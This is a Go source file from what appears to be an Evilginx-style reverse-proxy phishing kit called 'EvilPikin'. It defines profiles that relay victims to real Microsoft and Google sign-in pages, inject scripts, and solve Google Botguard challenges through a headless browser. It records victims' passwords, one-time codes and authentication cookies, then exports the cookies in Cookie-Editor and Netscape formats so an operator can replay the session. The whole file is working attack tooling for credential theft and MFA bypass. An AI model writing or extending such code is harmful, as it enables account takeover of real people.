package storage

import (
	"encoding/json"
	"strings"
	"time"
)

type CookieCaptureRule struct {
	Domain   string `json:"domain"`
	Name     string `json:"name"`
	Optional bool   `json:"optional"`
	InURL    bool   `json:"in_url"`
}

type LoginParam struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

type BodyToken struct {
	Name  string `json:"name"`
	Value string `json:"value"`
	Re    string `json:"re"`
}

type InjectionRule struct {
	URLPattern string `json:"url_pattern"`
	Type       string `json:"type"`
	Code       string `json:"code"`
	Position   string `json:"position"`
}

type SubFilter struct {
	Sub    string `json:"sub"`
	Domain string `json:"domain"`
}

// RouteMapping is one edge in the target's reverse-proxy chain. It explicitly
// pairs an original upstream host with the phishing host that stands in for it,
// exactly like Evilginx's subdomain matrix. The proxy Director routes incoming
// SNI/proxy_host -> upstream; the response rewriter maps upstream -> proxy_host
// inside HTML/JS/headers so the victim never escapes to the real origin.
type RouteMapping struct {
	Upstream  string `json:"upstream"`
	ProxyHost string `json:"proxy_host"`
	IsPrimary bool   `json:"is_primary"`
}

// CookieTrackingRule pairs a cookie name with the domain it is scoped to, for
// capture/exfil. Mirrors the new `cookie_tracking` block in the target schema.
type CookieTrackingRule struct {
	Domain string `json:"domain"`
	Name   string `json:"name"`
}

// TelemetryInjection is the new single-shot injection block (replaces the
// `injections` array in the legacy schema) for the tracking/interception script.
type TelemetryInjection struct {
	Position string `json:"position"`
	Code     string `json:"code"`
}

// EvilPuppetRule is one client-side challenge the engine must solve on the real
// origin via the headless-browser solver and replay into the victim's proxied
// request. Google's Botguard is the reference case: the victim's request to
// /accountLookup carries the domain-bound token in `token_param` (bgRequest);
// the solver mints a valid one on the genuine origin and the engine substitutes
// it so Google accepts the proxied flow.
type EvilPuppetRule struct {
	Path       string `json:"path"`        // trigger path on the phishing host, e.g. "/accountLookup"
	TokenParam string `json:"token_param"` // param carrying the minted token, e.g. "bgRequest"
	Field      string `json:"field"`       // form field whose value triggers generation, e.g. "identifier"
	RealPath   string `json:"real_path"`   // path on the real origin to drive; defaults to Path
}

// EvilPuppetConfig attaches an EvilPuppet solver to a target.
type EvilPuppetConfig struct {
	Enabled  bool             `json:"enabled"`
	SolveURL string           `json:"solve_url"` // genuine origin to drive, e.g. "https://accounts.google.com"
	Rules    []EvilPuppetRule `json:"rules"`
}

// ProxyHostEntry is one host in the reverse-proxy chain, modelled on Evilginx's
// proxy_hosts: it maps an original (legitimate) host to a phishing host and marks
// whether it is the landing/entry host and whether it carries session HTML.
// PhishSub/OrigSub are subdomain labels; Domain is the legitimate base domain.
// The phishing host is built as PhishSub + "." + siteDomain (or siteDomain when
// PhishSub is empty). The original host is OrigSub + "." + Domain.
type ProxyHostEntry struct {
	PhishSub  string `json:"phish_sub"`
	OrigSub   string `json:"orig_sub"`
	Domain    string `json:"domain"`
	Session   bool   `json:"session"`
	IsLanding bool   `json:"is_landing"`
	Port      int    `json:"port"`
}

// ResolvedProxyHost is a ProxyHostEntry with concrete phishing/original hosts.
type ResolvedProxyHost struct {
	PhishHost string
	OrigHost  string
	Session   bool
	IsLanding bool
	Port      int
}

type TargetProfile struct {
	ID             string               `json:"id"`
	Name           string               `json:"name"`
	Author         string               `json:"author"`
	Version        string               `json:"version"`
	MinVersion     string               `json:"min_version"`
	ProxyHost      string               `json:"proxy_host"`
	Origin         string               `json:"origin"`
	Lure           map[string]string    `json:"lure"`
	LoginURLs      []string             `json:"login_urls"`
	LoginParams    []LoginParam         `json:"login_params"`
	AuthURLs       []string             `json:"auth_urls"`
	RedirectURL    string               `json:"redirect_url"`
	LogoutURL      string               `json:"logout_url"`
	UsernameField  string               `json:"username_field"`
	PasswordField  string               `json:"password_field"`
	PhishSub       []string             `json:"phish_sub"`
	CookieTokens   []*CookieCaptureRule `json:"cookie_tokens"`
	BodyTokens     []BodyToken          `json:"body_tokens"`
	Injections     []*InjectionRule     `json:"injections"`
	ForceHTTPS     bool                 `json:"force_https"`
	Origins        []string             `json:"origins"`
	RelatedDomains map[string]string    `json:"related_domains"`
	ProxyHosts     []ProxyHostEntry     `json:"proxy_hosts"`
	// RoutingMatrix is the authoritative multi-domain chain: each original
	// upstream host mapped to its phishing proxy_host. When present it overrides
	// ProxyHosts/Origins/RelatedDomains for routing + response rewriting.
	RoutingMatrix      []RouteMapping       `json:"routing_matrix"`
	CookieTracking     []CookieTrackingRule `json:"cookie_tracking"`
	TelemetryInjection *TelemetryInjection  `json:"telemetry_injection"`
	SubFilters         []SubFilter          `json:"sub_filters"`
	EvilPuppet         *EvilPuppetConfig    `json:"evilpuppet"`
	Enabled            bool                 `json:"enabled"`
	CreatedAt          time.Time            `json:"created_at"`
	UpdatedAt          time.Time            `json:"updated_at"`
}

// Normalize back-fills the legacy fields the engine/capture code still reads
// from the new routing_matrix / cookie_tracking / telemetry_injection blocks,
// so a single target definition works whether it uses the new or old shape.
func (t *TargetProfile) Normalize() {
	if len(t.RoutingMatrix) > 0 && t.ProxyHost == "" {
		for _, m := range t.RoutingMatrix {
			if m.IsPrimary {
				t.ProxyHost = m.ProxyHost
				t.Origin = m.Upstream
				break
			}
		}
	}
	if len(t.CookieTracking) > 0 && len(t.CookieTokens) == 0 {
		for _, c := range t.CookieTracking {
			t.CookieTokens = append(t.CookieTokens, &CookieCaptureRule{Domain: c.Domain, Name: c.Name})
		}
	}
	if t.TelemetryInjection != nil && len(t.Injections) == 0 {
		t.Injections = []*InjectionRule{{
			URLPattern: "*",
			Type:       "js",
			Position:   t.TelemetryInjection.Position,
			Code:       t.TelemetryInjection.Code,
		}}
	}
}

// ResolvedProxyHosts expands the target into concrete phishing/original host
// pairs. Precedence: routing_matrix (authoritative multi-domain chain) ->
// ProxyHosts (legacy Evilginx-style) -> single ProxyHost/Origin/RelatedDomains.
func (t *TargetProfile) ResolvedProxyHosts(siteDomain string) []ResolvedProxyHost {
	if len(t.RoutingMatrix) > 0 {
		port := 443
		if !t.ForceHTTPS {
			port = 80
		}
		out := make([]ResolvedProxyHost, 0, len(t.RoutingMatrix))
		for _, m := range t.RoutingMatrix {
			out = append(out, ResolvedProxyHost{
				PhishHost: m.ProxyHost,
				OrigHost:  m.Upstream,
				Session:   m.IsPrimary,
				IsLanding: m.IsPrimary,
				Port:      port,
			})
		}
		return out
	}
	if len(t.ProxyHosts) > 0 {
		out := make([]ResolvedProxyHost, 0, len(t.ProxyHosts))
		for _, e := range t.ProxyHosts {
			ph := e.PhishSub
			if ph != "" {
				ph = ph + "." + siteDomain
			} else {
				ph = siteDomain
			}
			oh := e.OrigSub
			if oh != "" {
				oh = oh + "." + e.Domain
			} else {
				oh = e.Domain
			}
			port := e.Port
			if port == 0 {
				port = 443
			}
			out = append(out, ResolvedProxyHost{PhishHost: ph, OrigHost: oh, Session: e.Session, IsLanding: e.IsLanding, Port: port})
		}
		return out
	}
	out := []ResolvedProxyHost{}
	bport := 443
	if !t.ForceHTTPS {
		bport = 80
	}
	if t.ProxyHost != "" {
		out = append(out, ResolvedProxyHost{PhishHost: t.ProxyHost, OrigHost: t.Origin, Session: true, IsLanding: true, Port: bport})
	}
	for real, ph := range t.RelatedDomains {
		out = append(out, ResolvedProxyHost{PhishHost: ph, OrigHost: real, Session: false, IsLanding: false, Port: bport})
	}
	return out
}

type CapturedCookie struct {
	Name     string    `json:"name"`
	Value    string    `json:"value"`
	Domain   string    `json:"domain"`
	Path     string    `json:"path"`
	HttpOnly bool      `json:"http_only"`
	Secure   bool      `json:"secure"`
	SameSite string    `json:"same_site,omitempty"`
	Expiry   time.Time `json:"expiry,omitempty"`
}

// SessionFlow classifies the victim's authentication journey so operators can
// tell a bog-standard email/password/2FA capture apart from a password-reset
// deviation (which still yields the same credential + session material).
type SessionFlow string

const (
	FlowStandard      SessionFlow = "STANDARD_AUTH"
	FlowPasswordReset SessionFlow = "PASSWORD_RESET"
)

// IsAuthCookie reports whether a captured cookie is a persistent session/
// authorization token worth persisting for replay (Entra ID / MSA / Google style).
func (c CapturedCookie) IsAuthCookie() bool {
	switch strings.ToLower(c.Name) {
	case "estsauth", "estsauthpersistent", "rpssecauth", "signinstatecookie",
		"esctx", "x-ms-gateway-slice", "stsservicecookie", "fpc",
		"nhsba", "wlidperf", "uaid", "rpstssc", "mscc", "CCState",
		"jshs", "AADSSO", "AADSSOCookie", "buid", "wlid":
		return true
	// Google / Google Account persistent session & authorization cookies. Only
	// the post-authentication session cookies are treated as auth: NID/OTZ/CONSENT
	// are set on the anonymous page load and must NOT prematurely flag a session
	// as authorized before the victim enters a password.
	case "sid", "hsid", "ssid", "apisid", "sapisid",
		"__secure-1psid", "__secure-3psid", "__secure-1papisid", "__secure-3papisid",
		"osid", "lsid":
		return true
	}
	return false
}

type CapturedSession struct {
	ID         string                      `json:"id"`
	TargetID   string                      `json:"target_id"`
	TargetName string                      `json:"target_name"`
	LureID     string                      `json:"lure_id,omitempty"`
	Username   string                      `json:"username"`
	Password   string                      `json:"password"`
	OTPToken   string                      `json:"otp_token"`
	FlowType   SessionFlow                 `json:"flow_type"`
	Custom     map[string]string           `json:"custom"`
	Cookies    map[string][]CapturedCookie `json:"cookies"`
	Params     map[string]string           `json:"params"`
	RemoteAddr string                      `json:"remote_addr"`
	UserAgent  string                      `json:"user_agent"`
	Status     string                      `json:"status"`
	IsValid    bool                        `json:"is_valid"`
	// TelemetryLog is the complete step-by-step victim lifecycle, in order:
	// email entered, password entered, 2FA token entered, cookies captured, etc.
	TelemetryLog []string `json:"telemetry_log"`
	CreatedAt    time.Time `json:"created_at"`
	UpdatedAt    time.Time `json:"updated_at"`
}

// AuthCookies returns only the persistent session/authorization cookies.
func (s *CapturedSession) AuthCookies() []CapturedCookie {
	out := []CapturedCookie{}
	for _, cs := range s.Cookies {
		for _, c := range cs {
			if c.IsAuthCookie() {
				out = append(out, c)
			}
		}
	}
	return out
}

// NetscapeCookieLines renders the captured cookies in Netscape cookie-jar
// format (tab-separated: domain, flag, path, secure, expiry, name, value) so
// they can be imported directly into browsers / cookie-injection tooling.
func (s *CapturedSession) NetscapeCookieLines() []string {
	lines := []string{"# Netscape HTTP Cookie File", "# https://curl.haxx.se/rfc/cookie_spec.html", "# EvilPikin " + s.ID}
	add := func(c CapturedCookie) {
		domain := c.Domain
		if domain == "" {
			domain = "." + s.TargetName
		}
		flag := "FALSE"
		if strings.HasPrefix(domain, ".") {
			flag = "TRUE"
		}
		path := c.Path
		if path == "" {
			path = "/"
		}
		secure := "FALSE"
		if c.Secure {
			secure = "TRUE"
		}
		// No expiry is issued by the proxy; use a far-future sentinel.
		lines = append(lines, strings.Join([]string{
			domain, flag, path, secure, "1893456000", c.Name, c.Value,
		}, "\t"))
	}
	for _, cs := range s.Cookies {
		for _, c := range cs {
			add(c)
		}
	}
	return lines
}

// CookieEditorEntry is one element of the Cookie-Editor / EditThisCookie browser
// import array — the de-facto evilginx-compatible format operators paste into a
// cookie extension (Cookie-Editor on Chrome/Firefox, EditThisCookie) to replay a
// captured session seamlessly in their own browser. Field names match what those
// extensions expect on import.
type CookieEditorEntry struct {
	Domain         string `json:"domain"`
	Name           string `json:"name"`
	Value          string `json:"value"`
	Path           string `json:"path"`
	Secure         bool   `json:"secure"`
	HttpOnly       bool   `json:"httpOnly"`
	SameSite       string `json:"sameSite,omitempty"`
	ExpirationDate int64  `json:"expirationDate,omitempty"`
	HostOnly       bool   `json:"hostOnly,omitempty"`
}

func (s *CapturedSession) cookieEditorEntries(cookies []CapturedCookie) []CookieEditorEntry {
	out := make([]CookieEditorEntry, 0, len(cookies))
	for _, c := range cookies {
		domain := c.Domain
		if domain == "" {
			domain = s.TargetName
		}
		path := c.Path
		if path == "" {
			path = "/"
		}
		e := CookieEditorEntry{
			Domain:   domain,
			Name:     c.Name,
			Value:    c.Value,
			Path:     path,
			Secure:   c.Secure,
			HttpOnly: c.HttpOnly,
			HostOnly: !strings.HasPrefix(domain, "."),
		}
		// Normalize to the Cookie-Editor vocabulary ("no_restriction" /
		// "lax" / "strict"); the raw wire value is e.g. "None"/"Lax"/"Strict".
		switch strings.ToLower(c.SameSite) {
		case "none", "no_restriction":
			e.SameSite = "no_restriction"
		case "lax":
			e.SameSite = "lax"
		case "strict":
			e.SameSite = "strict"
		}
		if !c.Expiry.IsZero() {
			e.ExpirationDate = c.Expiry.Unix()
		}
		out = append(out, e)
	}
	return out
}

// CookiesJSON returns EVERY captured cookie in Cookie-Editor import format so
// the full authenticated session can be replayed in a browser.
func (s *CapturedSession) CookiesJSON() ([]byte, error) {
	all := []CapturedCookie{}
	for _, cs := range s.Cookies {
		all = append(all, cs...)
	}
	return json.MarshalIndent(s.cookieEditorEntries(all), "", "  ")
}

// AuthCookiesJSON returns only the persistent session/authorization cookies in
// Cookie-Editor import format — the minimum needed to impersonate the session.
func (s *CapturedSession) AuthCookiesJSON() ([]byte, error) {
	return json.MarshalIndent(s.cookieEditorEntries(s.AuthCookies()), "", "  ")
}

// AppendLog records a single timestamped telemetry line for this session.
func (s *CapturedSession) AppendLog(line string) {
	if s == nil {
		return
	}
	s.TelemetryLog = append(s.TelemetryLog, line)
}
